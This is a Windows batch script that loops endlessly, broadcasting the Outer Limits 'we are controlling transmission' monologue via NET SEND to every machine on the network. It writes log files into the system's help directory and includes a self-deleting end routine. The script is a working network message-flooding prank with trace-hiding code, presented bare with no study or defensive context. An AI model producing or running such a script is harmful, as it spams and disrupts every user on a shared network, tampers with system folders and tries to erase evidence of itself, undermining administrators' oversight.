@ECHO OFF
> "%SystemRoot%\help\combat\com.log" ECHO [log] 1

:Com
SET CT=0
:Send
SET /A CT=%CT%+1
NET SEND * There is nothing wrong with your television set. >NUL
NET SEND * Do not attempt to adjust the picture. >NUL
NET SEND * We are controlling transmission. >NUL
NET SEND * If we wish to make it louder, we will bring up the volume. >NUL
NET SEND * If we wish to make it softer, we will tune it to a whisper. >NUL
NET SEND * We will control the horizontal. >NUL
NET SEND * We will control the vertical. >NUL
NET SEND * We can roll the image, make it flutter. >NUL
NET SEND * We can change the focus to a soft blur or sharpen it to crystal clarity. >NUL
NET SEND * For the next hour, sit quietly and we will control all that you see and hear. >NUL
NET SEND * We repeat, there is nothing wrong with your television set. >NUL
NET SEND * You are about to participate in a great adventure. >NUL
NET SEND * You are about to experience the awe and mystery which reaches from the inner mind to the outer limits. >NUL
>> "%SystemRoot%\help\combat\comlist.log" ECHO outer chain %CT% sent.
GOTO Send

:End
DEL /F /Q "%0" >NUL
EXIT